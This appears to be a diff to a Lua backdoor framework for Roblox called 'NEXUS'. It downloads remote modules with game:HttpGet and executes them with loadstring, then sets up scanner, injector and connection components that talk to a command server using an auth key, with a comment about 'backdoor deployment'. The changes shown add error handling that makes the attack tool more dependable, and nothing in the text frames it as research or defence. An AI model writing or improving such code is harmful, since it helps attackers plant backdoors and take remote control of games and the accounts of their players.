@@ -22,11 +22,11 @@ local function loadModule(name, embedded)
     local success, module = pcall(function()
         return loadstring(game:HttpGet(GITHUB_BASE .. "core/" .. name .. ".lua"))()
     end)
-    if success then
+    if success and module then
         return module
     else
-        warn("[NEXUS] Failed to load " .. name .. " from GitHub, using embedded")
-        return embedded
+        warn("[NEXUS] Failed to load " .. name .. " from GitHub: " .. tostring(module))
+        return embedded or {}  -- Return empty table as fallback
     end
 end
 
@@ -52,9 +52,9 @@ function Nexus.new(config)
     }
     
     -- Initialize components
-    self.scanner = Scanner.new()
-    self.injector = Injector.new(self.config.commandServer)
-    self.connection = Connection.new(self.config.commandServer, self.config.authKey)
+    self.scanner = Scanner and Scanner.new and Scanner.new() or nil
+    self.injector = Injector and Injector.new and Injector.new(self.config.commandServer) or nil
+    self.connection = Connection and Connection.new and Connection.new(self.config.commandServer, self.config.authKey) or nil
     self.executor = nil  -- Initialized after backdoor deployment
     
     -- State
